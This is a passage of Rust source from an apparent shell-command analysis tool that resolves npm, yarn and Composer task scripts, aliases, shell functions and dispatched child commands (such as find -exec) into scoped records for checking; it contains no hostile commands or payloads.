    let language = if matches!(task_shell, Some("bash" | "/bin/bash" | "/usr/bin/bash")) {
        PayloadLanguage::Bash
    } else {
        PayloadLanguage::Sh
    };
    let child_source_scopes = extended_payload_source_scopes(
        source_scopes,
        parsed,
        command_index,
        scope_base_bindings,
        scope_entry_cwd,
    );
    let make_entry = |task_name: String, body: Option<String>| {
        let source = if body.is_some() {
            PayloadSource::InlineString
        } else {
            PayloadSource::DynamicReference
        };
        let input = match body {
            Some(text) => RecursivePayloadInput::LiteralText { text },
            None => RecursivePayloadInput::ArgumentFragments {
                fragments: vec![caushell_profile::RecursivePayloadArgumentFragment {
                    text: config_path.clone(),
                    quoted: true,
                    node_kind: "raw_string".into(),
                    span: parsed.commands[command_index].span.clone(),
                    materialization:
                        caushell_profile::RecursivePayloadFragmentMaterialization::DecodedLiteral,
                }],
            },
        };
        FrontierEntry {
            parent_ref: parent_ref.clone(),
            root_command_index,
            depth,
            candidate: RecursivePayloadCandidate {
                language,
                source,
                origin: RecursivePayloadOrigin::ConfigDefinedTask {
                    config_path: config_path.clone(),
                    task_name,
                },
                input,
            },
            bindings: child_bindings.clone(),
            positional_args: None,
            scope_entry_cwd: cwd.clone(),
            source_scopes: child_source_scopes.clone(),
        }
    };
    let unknown = || {
        vec![make_entry(
            task_name
                .clone()
                .filter(|s| !s.is_empty())
                .unwrap_or_else(|| "<unresolved-task>".into()),
            None,
        )]
    };
    if yarn_selection == Some(TaskSelection::Unresolved) {
        return unknown();
    }
    if dialect == ManifestTaskDialect::Composer
        && matches!(
            child_bindings.environment_value("COMPOSER"),
            caushell_profile::EnvironmentValueRef::Present(_)
        )
    {
        return unknown();
    }
    let Some(task_name) = task_name.clone().filter(|name| !name.is_empty()) else {
        return unknown();
    };
    if dialect == ManifestTaskDialect::Composer {
        match child_bindings.environment_value("COMPOSER_SKIP_SCRIPTS") {
            caushell_profile::EnvironmentValueRef::Present(SessionValue::ExactScalar(value)) => {
                if value.split(',').any(|s| s.trim() == task_name) {
                    return Vec::new();
                }
            }
            caushell_profile::EnvironmentValueRef::Present(_) => return unknown(),
            _ => {}
        }
    }
    if task_shells.as_ref().is_none_or(|shells| {
        shells.last().is_some_and(|shell| {
            !matches!(
                shell.as_str(),
                "sh" | "/bin/sh" | "/usr/bin/sh" | "bash" | "/bin/bash" | "/usr/bin/bash"
            )
        })
    }) {
        return unknown();
    }
    let ignores = bound
        .applied_modifiers
        .iter()
        .any(|m| m.as_str() == "ignore_task_lifecycle");
    let Some(ignore_values) = decoded_task_arguments(bound, "ignore_task_lifecycle_value") else {
        return unknown();
    };
    if ignore_values
        .iter()
        .any(|v| !matches!(v.as_str(), "true" | "false"))
    {
        return unknown();
    }
    let ignore_lifecycle = if dialect != ManifestTaskDialect::Npm {
        false
    } else if ignores {
        if ignore_values.len() > 1 {
            return unknown();
        }
        ignore_values.last().is_none_or(|v| v == "true")
    } else {
        matches!(child_bindings.environment_value("npm_config_ignore_scripts"), caushell_profile::EnvironmentValueRef::Present(SessionValue::ExactScalar(value)) if value == "true")
    };
    if dialect == ManifestTaskDialect::Npm
        && !bound
            .applied_modifiers
            .iter()
            .any(|m| m.as_str() == "task_shell")
        && matches!(child_bindings.environment_value("npm_config_script_shell"), caushell_profile::EnvironmentValueRef::Present(value) if !matches!(value, SessionValue::ExactScalar(shell) if matches!(shell.as_str(), "sh" | "/bin/sh" | "/usr/bin/sh" | "bash" | "/bin/bash" | "/usr/bin/bash")))
    {
        return unknown();
    }
    if !matches!(cwd, caushell_runner::EffectiveCwd::Known(_)) {
        return unknown();
    }
    let content = source_visible_file_content(
        registry,
        session,
        request,
        parsed,
        command_index,
        &config_path,
        &observations,
        &execution_cwds,
        source_scopes,
        None,
    );
    let content = match content {
        crate::support::StaticFileContent::Unobserved => return Vec::new(),
        crate::support::StaticFileContent::Unknown => return unknown(),
        crate::support::StaticFileContent::Known(content) => content,
    };
    let Ok(value) = serde_json::from_str::<JsonValue>(&content) else {
        return Vec::new();
    };
    if dialect != ManifestTaskDialect::Npm {
        let tasks = match dialect {
            ManifestTaskDialect::Yarn => yarn_tasks(
                &value,
                yarn_arguments.as_ref().and_then(Option::as_ref).unwrap(),
                ignore_install_scripts,
            ),
            ManifestTaskDialect::Composer => {
                let Some(args) = decoded_task_arguments(bound, "script_args") else {
                    return unknown();
                };
                composer_tasks(&value, &task_name, &args)
            }
            ManifestTaskDialect::Npm => unreachable!(),
        };
        return tasks
            .into_iter()
            .rev()
            .map(|task| make_entry(task.name, task.body))
            .collect();
    }
    let Some(scripts) = value.get("scripts").and_then(JsonValue::as_object) else {
        return Vec::new();
    };
    let Some(body) = scripts
        .get(&task_name)
        .and_then(JsonValue::as_str)
        .filter(|s| !s.is_empty())
    else {
        return Vec::new();
    };
    let args_slot = if bound.form_id.as_str() == "run_script" {
        "script_args"
    } else {
        "test_args"
    };
    let Some(args) = decoded_task_arguments(bound, args_slot) else {
        return unknown();
    };
    let mut body = body.to_string();
    for arg in args {
        body.push(' ');
        body.push_str(&quote_task_argument(&arg));
    }
    let mut entries = Vec::new();
    for event in [
        format!("pre{task_name}"),
        task_name.clone(),
        format!("post{task_name}"),
    ] {
        let script = if event == task_name {
            Some(body.clone())
        } else if ignore_lifecycle {
            None
        } else {
            scripts
                .get(&event)
                .and_then(JsonValue::as_str)
                .filter(|s| !s.is_empty())
                .map(str::to_owned)
        };
        if let Some(script) = script {
            entries.push(make_entry(event, Some(script)));
        }
    }
    entries.reverse();
    entries
}

fn source_visible_file_content(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    path: &str,
    observations: &[(ResolveInvocationArtifactResult, SessionBindings)],
    execution_cwds: &[caushell_runner::EffectiveCwd],
    source_scopes: &[PayloadSourceScope],
    entry_content: Option<crate::support::StaticFileContent>,
) -> crate::support::StaticFileContent {
    let mut content = entry_content;
    for scope in source_scopes {
        let observations = source_scope_observations(
            registry,
            request,
            &scope.parsed,
            scope.before_command_index,
            &scope.bindings,
        );
        let cwds = super::compute_effective_cwd::source_scope_execution_cwds(
            &scope.parsed,
            request,
            &scope.entry_cwd,
            &observations,
        )
        .1;
        content = Some(crate::support::static_file_content_before_scoped_command(
            caushell_query::QuerySession::from_session(&session),
            registry,
            request,
            &scope.parsed,
            scope.before_command_index,
            path,
            &observations,
            &cwds,
            content,
        ));
    }
    let content = crate::support::static_file_content_before_scoped_command(
        caushell_query::QuerySession::from_session(&session),
        registry,
        request,
        parsed,
        command_index,
        path,
        &observations,
        &execution_cwds,
        content,
    );
    content
}

fn source_scope_observations(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    index: usize,
    base: &SessionBindings,
) -> Vec<(ResolveInvocationArtifactResult, SessionBindings)> {
    if index > 256 {
        return Vec::new();
    }
    let mut aliases = alias_bindings(&caushell_types::SessionSummary::new(), request);
    parsed
        .commands
        .iter()
        .take(index + 1)
        .map(|command| {
            let bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                base.clone(),
                parsed,
                command.span.start_byte,
                request.sequence_no,
            );
            let result = resolve_invocation_artifact_with_bindings(
                registry,
                &expand_alias_chain(
                    command,
                    request.shell_kind,
                    &aliases,
                    MAX_ALIAS_EXPANSION_HOPS,
                )
                .0,
                InvocationRuntimeContext::new(),
                &bindings,
            );
            apply_alias_command(&mut aliases, command, request.sequence_no);
            (result, bindings)
        })
        .collect()
}

fn source_payload_cwd(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    index: usize,
    base: &SessionBindings,
    initial: &caushell_runner::EffectiveCwd,
) -> caushell_runner::EffectiveCwd {
    let observations = source_scope_observations(registry, request, parsed, index, base);
    super::compute_effective_cwd::source_scope_execution_cwds(
        parsed,
        request,
        initial,
        &observations,
    )
    .1
    .get(index)
    .cloned()
    .unwrap_or(caushell_runner::EffectiveCwd::Unknown)
}

fn native_payload_bindings(
    candidate: &RecursivePayloadCandidate,
    base: &SessionBindings,
) -> SessionBindings {
    if matches!(
        candidate.origin,
        RecursivePayloadOrigin::NativeChildShell { .. }
    ) {
        // The native runtime may modify ENVIRON or other process state. Do not
        // import caller locals, aliases, functions, positionals or native facts.
        SessionBindings::new()
    } else {
        base.clone()
    }
}

fn materialize_frontier_entry(
    entry: &FrontierEntry,
) -> caushell_profile::MaterializedRecursivePayloadCandidate {
    let mut candidate = materialize_recursive_payload_candidate(&entry.candidate, &entry.bindings);
    if entry.candidate.source == PayloadSource::DynamicReference
        && !entry
            .candidate
            .language
            .requires_opaque_execution_boundary()
        && matches!(
            entry.candidate.origin,
            RecursivePayloadOrigin::ConfigDefinedTask { .. }
        )
    {
        if let RecursivePayloadOrigin::ConfigDefinedTask { config_path, .. } =
            &entry.candidate.origin
        {
            candidate.resolution = ValueMaterialization::UnsupportedDynamicText {
                text: config_path.clone(),
            };
        }
    }
    candidate
}

fn resolve_conventional_path(cwd: &str, target_path: &str) -> String {
    let path = Path::new(target_path);
    if path.is_absolute() {
        return target_path.to_string();
    }

    Path::new(cwd).join(path).to_string_lossy().into_owned()
}

fn alias_bindings(
    summary: &caushell_types::SessionSummary,
    request: &CheckRequest,
) -> BTreeMap<String, SessionAliasBinding> {
    let mut bindings: BTreeMap<String, SessionAliasBinding> = summary
        .alias_bindings()
        .cloned()
        .map(|binding| (binding.name.clone(), binding))
        .collect();

    if request.shell_state_before.observability.aliases
        == caushell_types::ShellStateKnowledge::Complete
    {
        bindings.clear();
    }

    for alias in &request.shell_state_before.aliases {
        bindings.insert(
            alias.name.clone(),
            SessionAliasBinding::new(alias.name.clone(), alias.body.clone(), request.sequence_no),
        );
    }

    bindings
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct TopLevelDispatchDerivedCommand {
    lookup_domain: caushell_profile::CommandLookupDomain,
    source_command_index: usize,
    dispatch_index: usize,
    command_slot: String,
    parent_node_id: caushell_graph::NodeId,
    bindings: SessionBindings,
    command: caushell_parse::CommandFact,
    stdin_available: bool,
    stdout_proofs: Vec<(
        caushell_parse::SourceSpan,
        caushell_profile::SubstitutionOutputProof,
    )>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct TopLevelFunctionDerivedCommand {
    source_command_index: usize,
    function_name: String,
    derived_command_index: usize,
    parent_node_id: caushell_graph::NodeId,
    bindings: SessionBindings,
    scope_base_bindings: SessionBindings,
    parsed_body: caushell_parse::ParsedCommandArtifact,
    command: caushell_parse::CommandFact,
}

/// A function invocation owns a shell scope even when that scope contains no
/// executable CommandFact. Assignment expansions must not depend on finding a
/// first ordinary command to act as their seed.
struct TopLevelFunctionScope {
    source_command_index: usize,
    function_name: String,
    parent_node_id: caushell_graph::NodeId,
    call_command: caushell_parse::CommandFact,
    call_bindings: SessionBindings,
    bindings: SessionBindings,
    parsed_body: caushell_parse::ParsedCommandArtifact,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct TopLevelAliasDerivedCommand {
    source_command_index: usize,
    alias_hop_index: usize,
    alias_name: String,
    parent_node_id: caushell_graph::NodeId,
    command: caushell_parse::CommandFact,
}

fn collect_top_level_command_resolve_records(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    max_nested_parse_depth: u8,
) -> (
    Vec<ResolvedCommandSeed>,
    Vec<TopLevelAliasDerivedCommand>,
    Vec<TopLevelFunctionDerivedCommand>,
    Vec<TopLevelFunctionScope>,
) {
    let mut records = Vec::with_capacity(parsed.commands.len());
    let mut alias_derived_commands = Vec::new();
    let mut function_derived_commands = Vec::new();
    let mut function_scopes = Vec::new();

    for (command_index, command) in parsed.commands.iter().enumerate() {
        let source_node_id = source_node_id_for_command(request, parsed, command_index, command);
        let variable_overlay = runtime_source_bindings_before_span(
            registry,
            caushell_query::QuerySession::new(session.graph(), session.summary()),
            request,
            parsed,
            command.span.start_byte,
        );
        let mut alias_overlay = variable_overlay
            .alias_bindings()
            .map(|b| (b.name.clone(), b.clone()))
            .collect();
        let expansion = crate::support::expand_alias_scope(
            command,
            request.shell_kind,
            &alias_overlay,
            MAX_ALIAS_EXPANSION_HOPS,
        );
        if let Some(reason) = expansion.incomplete {
            records.push(ResolvedCommandSeed::new(
                source_node_id,
                ParsedCommandRef::new(command_index, command.span.clone()),
                unresolved_alias_result(
                    command.command_name.as_deref().unwrap_or_default(),
                    reason,
                ),
            ));
            apply_alias_command(&mut alias_overlay, command, request.sequence_no);
            continue;
        }
        let alias_has_redirections = expansion
            .parsed
            .as_ref()
            .is_some_and(|p| !p.redirections.is_empty());
        let resolved_command = expansion.command;
        let resolved_command =
            caushell_profile::materialize_structured_command(&resolved_command, &variable_overlay)
                .unwrap_or(resolved_command);

        alias_derived_commands.extend(project_alias_derived_commands(
            request,
            command_index,
            &source_node_id,
            expansion.hops,
        ));

        if let Some(binding) = resolved_command
            .command_name
            .as_deref()
            .and_then(|command_name| {
                if resolved_command.command_name_runtime_data {
                    Some(command_name.to_owned())
                } else {
                    caushell_profile::materialize_command_name(command_name, &variable_overlay)
                }
            })
            .as_deref()
            .and_then(|command_name| variable_overlay.function_binding(command_name))
            .filter(|binding| binding.uncertainty.is_none() && !alias_has_redirections)
        {
            let projection = caushell_profile::materialize_projected_invocation(
                &caushell_profile::project_invocation(
                    &resolved_command,
                    runtime_context_for_top_level_command(parsed, command_index, &resolved_command),
                ),
                &variable_overlay,
            );
            let environment = crate::support::command_environment_bindings(
                &variable_overlay,
                parsed,
                &ParsedCommandRef::new(command_index, command.span.clone()),
            );
            let function_bindings =
                crate::support::function_call_bindings(&environment, &projection);
            let (derived_commands, parsed_body) = project_function_derived_commands(
                registry,
                request,
                command_index,
                &source_node_id,
                binding,
                &function_bindings,
            );
            function_derived_commands.extend(derived_commands);
            function_scopes.push(TopLevelFunctionScope {
                source_command_index: command_index,
                function_name: binding.name.clone(),
                parent_node_id: source_node_id,
                call_command: resolved_command,
                call_bindings: variable_overlay.clone(),
                bindings: function_bindings,
                parsed_body,
            });
            apply_alias_command(&mut alias_overlay, command, request.sequence_no);
            continue;
        }

        let mut result = caushell_profile::resolve_invocation_artifact_with_stdout_proofs(
            registry,
            &resolved_command,
            runtime_context_for_top_level_command(parsed, command_index, &resolved_command),
            &variable_overlay,
            &crate::support::substitution_shapes(
                registry,
                &resolved_command,
                request.shell_kind,
                &variable_overlay,
                &alias_overlay,
                max_nested_parse_depth,
            ),
        );
        if command.command_name.as_deref() == Some("ln")
            && !command.command_name_runtime_data
            && command == &resolved_command
            && parsed.status == caushell_parse::ParseStatus::Complete
            && parsed.diagnostics.is_empty()
            && parsed.commands.len() == 1
            && parsed.redirections.is_empty()
            && command.text.trim() == parsed.raw_command.trim()
            && !command.in_pipeline
            && !command.guarded
            && !command.conditional_execution
            && command.terminator.is_none()
            && command.prefix_assignments.is_empty()
            && caushell_parse::parse_process_substitutions(&parsed.raw_command, parsed.shell_kind)
                .is_ok_and(|substitutions| substitutions.is_empty())
            && let Some(profile) = registry.lookup("ln").profile
            && let ResolveInvocationArtifactResult::Resolved(resolved) = &mut result
        {
            let positional_capture = if request.shell_kind == caushell_types::ShellKind::Bash
                && max_nested_parse_depth > 0
                && let [_, token, _] = command.tokens.as_slice()
            {
                crate::support::quoted_find_positional_capture(
                    registry, token, &variable_overlay, &alias_overlay,
                ).map(|capture_span| (capture_span, &token.span))
            } else {
                None
            };
            if let Ok(captures) =
                caushell_parse::parse_command_substitutions(&parsed.raw_command, parsed.shell_kind)
            {
                match (captures.as_slice(), positional_capture) {
                    ([], None) => resolved.retain_standalone_symbolic_link_effects(profile, None),
                    ([capture], Some((capture_span, token_span))) if capture.span == capture_span => {
                        resolved.retain_standalone_symbolic_link_effects(profile, Some(token_span));
                    }
                    _ => {}
                }
            }
        }
        records.push(ResolvedCommandSeed::new(
            source_node_id,
            ParsedCommandRef::new(command_index, command.span.clone()),
            result,
        ));

        apply_alias_command(&mut alias_overlay, command, request.sequence_no);
    }

    (
        records,
        alias_derived_commands,
        function_derived_commands,
        function_scopes,
    )
}

fn project_alias_derived_commands(
    request: &CheckRequest,
    source_command_index: usize,
    source_node_id: &caushell_graph::NodeId,
    alias_hops: Vec<AliasExpansionHop>,
) -> Vec<TopLevelAliasDerivedCommand> {
    let mut parent_node_id = source_node_id.clone();
    let mut derived_commands = Vec::with_capacity(alias_hops.len());

    for (alias_hop_index, hop) in alias_hops.into_iter().enumerate() {
        let node_id = alias_derived_invocation_node_id(
            &request.session_id,
            request.sequence_no,
            source_command_index,
            alias_hop_index,
        );

        derived_commands.push(TopLevelAliasDerivedCommand {
            source_command_index,
            alias_hop_index,
            alias_name: hop.alias_name,
            parent_node_id: parent_node_id.clone(),
            command: hop.command,
        });

        parent_node_id = node_id;
    }

    derived_commands
}

fn project_function_derived_commands(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    source_command_index: usize,
    source_node_id: &caushell_graph::NodeId,
    binding: &SessionFunctionBinding,
    bindings: &SessionBindings,
) -> (
    Vec<TopLevelFunctionDerivedCommand>,
    caushell_parse::ParsedCommandArtifact,
) {
    let (parsed_body, _) =
        execution_body_scope(&binding.body, request.shell_kind, false, "function body");

    let commands = parsed_body
        .commands
        .iter()
        .enumerate()
        .map(
            |(derived_command_index, command)| TopLevelFunctionDerivedCommand {
                source_command_index,
                function_name: binding.name.clone(),
                derived_command_index,
                parent_node_id: source_node_id.clone(),
                scope_base_bindings: bindings.clone(),
                bindings: apply_runtime_variable_bindings_before_span(
                    registry,
                    request,
                    bindings.clone(),
                    &parsed_body,
                    command.span.start_byte,
                    request.sequence_no,
                ),
                parsed_body: parsed_body.clone(),
                command: command.clone(),
            },
        )
        .collect();
    (commands, parsed_body)
}

fn project_parsed_command_scopes(
    request: &caushell_types::CheckRequest,
    function_commands: &[TopLevelFunctionDerivedCommand],
    nested_payload_records: &[NestedPayloadRecord],
    execution_unit_records: &[ExecutionUnitResolveRecord],
) -> Vec<ParsedCommandScope> {
    let mut scopes = project_function_parsed_command_scopes(request, function_commands);
    scopes.extend(project_nested_payload_parsed_command_scopes(
        request,
        nested_payload_records,
    ));
    scopes.extend(project_execution_unit_parsed_command_scopes(
        execution_unit_records,
    ));
    scopes
}

fn project_function_parsed_command_scopes(
    request: &caushell_types::CheckRequest,
    function_commands: &[TopLevelFunctionDerivedCommand],
) -> Vec<ParsedCommandScope> {
    let mut scopes = Vec::new();
    let mut current_key: Option<(usize, String)> = None;
    let mut current_commands: Vec<&TopLevelFunctionDerivedCommand> = Vec::new();

    for command in function_commands {
        let key = (command.source_command_index, command.function_name.clone());
        if current_key.as_ref().is_some_and(|current| current != &key) {
            if let Some(scope) =
                function_parsed_command_scope_from_commands(request, &current_commands)
            {
                scopes.push(scope);
            }
            current_commands.clear();
        }

        current_key = Some(key);
        current_commands.push(command);
    }

    if let Some(scope) = function_parsed_command_scope_from_commands(request, &current_commands) {
        scopes.push(scope);
    }

    scopes
}

fn function_parsed_command_scope_from_commands(
    request: &caushell_types::CheckRequest,
    commands: &[&TopLevelFunctionDerivedCommand],
) -> Option<ParsedCommandScope> {
    let first = *commands.first()?;
    let command_node_ids = indexed_scope_command_node_ids(
        first.parsed_body.commands.len(),
        commands.iter().map(|command| {
            (
                command.derived_command_index,
                function_derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    command.source_command_index,
                    command.derived_command_index,
                ),
            )
        }),
    )?;
    let scope_node_id = command_node_ids.first()?.clone();

    Some(ParsedCommandScope::new(
        scope_node_id,
        first.parsed_body.clone(),
        command_node_ids,
    ))
}

fn project_nested_payload_parsed_command_scopes(
    request: &caushell_types::CheckRequest,
    nested_payload_records: &[NestedPayloadRecord],
) -> Vec<ParsedCommandScope> {
    nested_payload_records
        .iter()
        .filter_map(|record| {
            let NestedPayloadResolution::Parsed { parsed, .. } = &record.resolution else {
                return None;
            };

            let command_node_ids = indexed_scope_command_node_ids(
                parsed.commands.len(),
                parsed
                    .commands
                    .iter()
                    .enumerate()
                    .map(|(derived_command_index, _)| {
                        (
                            derived_command_index,
                            derived_invocation_node_id(
                                &request.session_id,
                                request.sequence_no,
                                record.record_id.0,
                                derived_command_index,
                            ),
                        )
                    }),
            )?;
            let scope_node_id = command_node_ids.first()?.clone();

            Some(ParsedCommandScope::new(
                scope_node_id,
                parsed.clone(),
                command_node_ids,
            ))
        })
        .collect()
}

fn project_execution_unit_parsed_command_scopes(
    execution_unit_records: &[ExecutionUnitResolveRecord],
) -> Vec<ParsedCommandScope> {
    let mut grouped: BTreeMap<
        (
            caushell_graph::NodeId,
            ExecutionUnitOriginKind,
            ExecutionUnitOriginLocator,
        ),
        Vec<&ExecutionUnitResolveRecord>,
    > = BTreeMap::new();

    for record in execution_unit_records {
        if !matches!(
            record.origin_kind,
            ExecutionUnitOriginKind::CommandSubstitutionBody
                | ExecutionUnitOriginKind::CommandSubstitutionMaterialization
                | ExecutionUnitOriginKind::ProcessSubstitutionBody
                | ExecutionUnitOriginKind::ShellCommandStringPayload
        ) {
            continue;
        }

        grouped
            .entry((
                record.parent_execution_node_id.clone(),
                record.origin_kind,
                record.origin_locator.clone(),
            ))
            .or_default()
            .push(record);
    }

    grouped
        .into_values()
        .filter_map(|records| {
            let first = *records.first()?;
            let command_node_ids = indexed_scope_command_node_ids(
                first.parsed_scope.commands.len(),
                records.iter().map(|record| {
                    (
                        record.command_ref.command_index,
                        record.source_node_id.clone(),
                    )
                }),
            )?;
            let scope_node_id = command_node_ids.first()?.clone();

            Some(ParsedCommandScope::new(
                scope_node_id,
                first.parsed_scope.clone(),
                command_node_ids,
            ))
        })
        .collect()
}

fn indexed_scope_command_node_ids(
    expected_len: usize,
    indexed_node_ids: impl IntoIterator<Item = (usize, caushell_graph::NodeId)>,
) -> Option<Vec<caushell_graph::NodeId>> {
    if expected_len == 0 {
        return None;
    }

    let mut command_node_ids = vec![None; expected_len];

    for (command_index, node_id) in indexed_node_ids {
        let slot = command_node_ids.get_mut(command_index)?;
        if slot.replace(node_id).is_some() {
            return None;
        }
    }

    command_node_ids.into_iter().collect()
}

fn collect_top_level_dispatch_derived_commands(
    registry: &ProfileRegistry,
    summary: &caushell_types::SessionSummary,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    records: &[ResolvedCommandSeed],
) -> Vec<TopLevelDispatchDerivedCommand> {
    let mut commands = Vec::new();

    for record in records {
        let ResolveInvocationArtifactResult::Resolved(resolved) = &record.result else {
            continue;
        };
        if should_skip_generic_dispatch_projection(resolved) {
            continue;
        }

        let projection = dispatch_projection_for_resolved(
            registry,
            resolved,
            request.shell_state_before.cwd(),
            request.home.as_deref(),
        );
        let parent_bindings = runtime_visible_variable_bindings_before_span(
            registry,
            summary,
            request,
            parsed,
            record.command_ref.span.start_byte,
            request.sequence_no,
        );

        for candidate in projection.resolved {
            let command = materialized_dispatch_child_command_fact(resolved, &candidate);
            let parent_bindings = crate::support::command_environment_bindings(
                &parent_bindings,
                parsed,
                &record.command_ref,
            );
            let child_bindings =
                dispatch_child_session_bindings(&parent_bindings, &candidate, &command);
            commands.push(TopLevelDispatchDerivedCommand {
                stdout_proofs: forwarded_substitution_shapes(resolved, &command),
                lookup_domain: candidate.lookup_domain.clone(),
                stdin_available: candidate.stdin_from_parent
                    || candidate.stdin_from_tool
                    || resolved.projection.stdin_payload_available,
                source_command_index: record.command_ref.command_index,
                dispatch_index: candidate.dispatch_index,
                command_slot: candidate.command.slot.as_str().to_string(),
                parent_node_id: record.source_node_id.clone(),
                bindings: child_bindings,
                command,
            });
        }

    }

    commands
}

fn should_skip_generic_dispatch_projection(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
) -> bool {
    (resolved.normalized_command_name.as_str() == "xargs"
        && resolved.bound.form_id.as_str() == "dispatch_from_stdin")
        || parallel_template_slot(&resolved.bound).is_some()
}

fn materialized_dispatch_child_command_fact(
    parent: &caushell_profile::ResolvedInvocationArtifact,
    candidate: &caushell_profile::DispatchCommandCandidate,
) -> caushell_parse::CommandFact {
    let _ = parent;
    candidate.to_command_fact()
}

/// Dispatch forwards argv, not shell source. Transfer a proof only when the
/// original span and lexical metadata identify an unchanged parent field.
/// Synthetic/tool-decoded/replaced arguments never acquire this proof.
fn forwarded_substitution_shapes(
    parent: &caushell_profile::ResolvedInvocationArtifact,
    child: &caushell_parse::CommandFact,
) -> Vec<(
    caushell_parse::SourceSpan,
    caushell_profile::SubstitutionOutputProof,
)> {
    if !parent
        .materialized_projection
        .invocation
        .args
        .iter()
        .any(|arg| arg.substitution_shape.is_some())
    {
        return Vec::new();
    }
    child
        .tokens
        .iter()
        .filter_map(|token| {
            let original = parent
                .materialized_projection
                .invocation
                .args
                .iter()
                .find(|arg| {
                    arg.span == token.span
                        && arg.text == token.text
                        && arg.quoted == token.quoted
                        && arg.node_kind == token.node_kind
                        && !arg.runtime_data
                        && !token.runtime_data
                        && arg.implicit_input_source.is_none()
                        && token.implicit_input_source.is_none()
                })?;
            Some((token.span.clone(), original.substitution_output_proof()?))
        })
        .collect()
}

fn parsed_dispatch_scope(
    command: caushell_parse::CommandFact,
    shell_kind: caushell_types::ShellKind,
) -> Option<(
    caushell_parse::ParsedCommandArtifact,
    caushell_parse::CommandFact,
)> {
    let parsed = caushell_parse::ParsedCommandArtifact {
        raw_command: command.text.clone(),
        shell_kind,
        status: caushell_parse::ParseStatus::Complete,
        commands: vec![command.clone()],
        declaration_commands: Vec::new(),
        assignment_commands: Vec::new(),
        for_loops: Vec::new(),
        unset_commands: Vec::new(),
        shell_evaluations: Vec::new(),
        function_definitions: Vec::new(),
        redirections: Vec::new(),
        diagnostics: Vec::new(),
        status_conditions: Vec::new(),
    };
    Some((parsed, command))
}

/// Authoritative resolved/unresolved partition for every dispatch consumer:
/// child expansion, unresolved reports, coverage and depth admission. Native
/// argument regions and registered module contracts must stay paired here.
fn dispatch_projection_for_resolved(
    registry: &ProfileRegistry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    cwd: &str,
    home: Option<&str>,
) -> caushell_profile::DispatchCommandProjection {
    if resolved.normalized_command_name.as_str() == "find"
        && !resolved.bound.argument_regions.is_empty()
        && resolved
            .bound
            .argument_regions
            .iter()
            .all(|r| matches!(r.id.as_str(), "exec" | "execdir" | "ok" | "okdir"))
    {
        let (candidates, mut unresolved) = find_dispatch_candidates(registry, resolved, cwd, home);
        // This adapter marks only completely decoded executable bytes as
        // runtime data. A preserved source token such as "$UNKNOWN" is not
        // a resolved executable, even without a find placeholder domain.
        let command_is_exact = |c: &caushell_profile::DispatchCommandCandidate| {
            c.command.runtime_data && c.command.implicit_input_source.is_none()
        };
        unresolved.extend(
            candidates.iter().filter(|c| !command_is_exact(c)).map(|c| {
                caushell_profile::UnresolvedDispatchCommand {
                    lookup_domain: caushell_profile::CommandLookupDomain::External,
                    dispatch_index: c.dispatch_index,
                    command_slot: c.command.slot.clone(),
                }
            }),
        );
        // Each validated region supplies all possible child argv layouts.
        // Consumers share this partition, including depth and coverage checks.
        return caushell_profile::DispatchCommandProjection {
            resolved: candidates
                .into_iter()
                .filter(command_is_exact)
                .collect(),
            unresolved,
        };
    }

    registered_dispatch_projection(registry, resolved)
}

fn registered_dispatch_projection(
    registry: &ProfileRegistry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
) -> caushell_profile::DispatchCommandProjection {
    let mut projection = collect_dispatch_command_projection(&resolved.bound);
    let unresolved = &mut projection.unresolved;
    projection.resolved.retain(|candidate| {
        let known = candidate
            .lookup_domain
            .module_runtime()
            .is_none_or(|runtime| {
                registry
                    .lookup_module(runtime, &candidate.command.text)
                    .profile
                    .is_some()
            });
        if !known
            && !unresolved
                .iter()
                .any(|gap| gap.dispatch_index == candidate.dispatch_index)
        {
            unresolved.push(caushell_profile::UnresolvedDispatchCommand {
                lookup_domain: candidate.lookup_domain.clone(),
                dispatch_index: candidate.dispatch_index,
                command_slot: candidate.command.slot.clone(),
            });
        }
        known
    });
    // A declared module execution without a registered CLI contract is an
    // unresolved child, not a same-named executable or an understood program.
    projection
}

pub(super) fn complete_native_dispatch_nodes(
    ctx: &RunnerContext,
) -> std::collections::BTreeSet<String> {
    ctx.dispatch_projection_records()
        .iter()
        .filter_map(|record| {
            let projection = &record.projection;
            if projection.resolved.is_empty() || !projection.unresolved.is_empty() {
                return None;
            }
            projection.resolved.iter().all(|candidate| {
                ctx.execution_unit_resolve_records().iter().any(|child| {
                    child.parent_execution_node_id == record.source_node_id
                        && child.origin_kind == ExecutionUnitOriginKind::Dispatch
                        && child.origin_index == candidate.dispatch_index
                })
            }).then(|| record.source_node_id.0.clone())
        })
        .collect()
}

fn find_dispatch_candidates(
    registry: &ProfileRegistry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    cwd: &str,
    home: Option<&str>,
) -> (
    Vec<caushell_profile::DispatchCommandCandidate>,
    Vec<caushell_profile::UnresolvedDispatchCommand>,
) {
    use caushell_profile::{
        ArgumentBindingSource, CommandLookupDomain, DispatchArgument, DispatchCommandCandidate,
        DispatchWorkingDirectory, SlotName, UnresolvedDispatchCommand,
    };

    const MAX_LAYOUTS_PER_REGION: usize = 16;

    let tokens = &resolved.materialized_projection.invocation.args;
    let decoded = tokens
        .iter()
        .zip(&resolved.materialized_projection.arg_resolutions)
        .map(|(token, resolution)| decoded_projected_argv_value(token, resolution, home))
        .collect::<Vec<_>>();
    let root_values = resolved
        .bound
        .bound_parameters
        .iter()
        .filter(|parameter| parameter.name.as_str() == "search_roots")
        .flat_map(|parameter| parameter.values.iter())
        .collect::<Vec<_>>();
    let mut roots_unknown = root_values
        .iter()
